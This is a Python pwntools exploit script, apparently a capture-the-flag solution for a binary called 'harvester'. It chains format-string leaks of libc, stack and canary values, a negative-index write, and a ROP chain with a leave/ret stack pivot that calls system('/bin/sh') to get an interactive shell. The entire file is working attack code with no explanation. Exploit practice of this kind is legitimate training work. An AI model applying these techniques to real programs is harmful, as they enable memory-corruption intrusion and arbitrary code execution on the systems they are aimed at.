from pwn import *
local_bin = "./harvester_original"
elf = ELF(local_bin)
rop = ROP(elf)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
#libc = ELF("./libc.so.6")
roplibc = ROP(libc)


#p = gdb.debug(local_bin, '''
	#set follow-fork-mode child
	#break fight
	#break *fight+113
	#break *fight+125
	#break *stare
	#break *stare+233
	#break *inventory
	#break *stare+177
	#continue
	#''')
p = process(local_bin)

def fight(message):
	p.recvuntil(b'>')
	p.sendline(b'1')
	p.recvuntil(b'>')
	p.send(message)

def stare():
	p.recvuntil(b'>')
	p.sendline(b'3')
	p.recvuntil(b'!')

def stareTrigger(message):
	p.recvuntil(b'>')
	p.sendline(b'3')
	p.recvuntil(b'it')
	p.send(message)

def drop(number):
	p.recvuntil(b'>')
	p.sendline(b'2')
	p.recvuntil(b'some?')
	p.sendline(b'y')
	p.recvuntil(b'drop')
	p.sendline(number)

##################################################################
#This section used to leak libc
leak_libc_offset = 0x7ffff7e15d0a - 0x7ffff7def000

fight(b'%21$p')	#leak libc address (0x00007ffff7a03bf7)
output = p.recvuntil(b'is: ')
output = p.recvuntil(b'\x1b')
leak_libc = output[:-1]
leak_libc = int(leak_libc, 16)
log.info("leak libc = " + hex(leak_libc))
libc_base = leak_libc - leak_libc_offset
log.info("libc base = " + hex(libc_base))

libc.address = libc_base
BINSH = next(libc.search(b"/bin/sh")) #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]
POPRDI_gadget = (roplibc.find_gadget(['pop rdi','ret']))[0]
POPRDI_gadget = POPRDI_gadget + libc_base
log.info("POPRDI_gadget = "+ hex(POPRDI_gadget))
leave_ret_Gadget = (roplibc.find_gadget(['leave','ret']))[0] + libc_base
log.info("Leave ret gadget = "+ hex(leave_ret_Gadget))

##################################################################
#This section used to leak stack address
#STACK_OFFSET is calculated from testing, count the ROP/shellcode address
#Stack is required to do the pivot later
STACK_OFFSET = 0x07fffffffe5d8 - 0x7fffffffe470
fight(b'%22$p')

output = p.recvuntil(b'is: ')
output = p.recvuntil(b'\x1b')
leak_stack = output[:-1]
leak_stack = int(leak_stack, 16)
log.info("leak stack = " +hex(leak_stack))
shellcode_addr = leak_stack - STACK_OFFSET
log.info("shellcode addr = "+ hex(shellcode_addr))

##################################################################
#This section used to leak stack canary
fight(b'%19$p')	#leak stack canary (0xe1d5fe2a26b3a600)
output = p.recvuntil(b'is: ')
output = p.recvuntil(b'\x1b')
leak_canary = output[:-1]
leak_canary = int(leak_canary, 16)
log.info("leak canary = " +hex(leak_canary))


##################################################################
#This section used to trigger RIP control
drop(b'-6')
drop(b'-5')

payload = p64(POPRDI_gadget, endian='little')
payload += p64(BINSH)
payload += p64(POPRDI_gadget+1, endian='little')
payload += p64(SYSTEM)
payload += p64(POPRDI_gadget+1, endian='little')
payload += p64(leak_canary)
payload += p64(shellcode_addr-8, endian='little')	#To jump to the first gadget
payload += p64(leave_ret_Gadget)	#rsp = 0x7fffffffed28

stareTrigger(payload)#0x7fffffffe480

p.interactive()
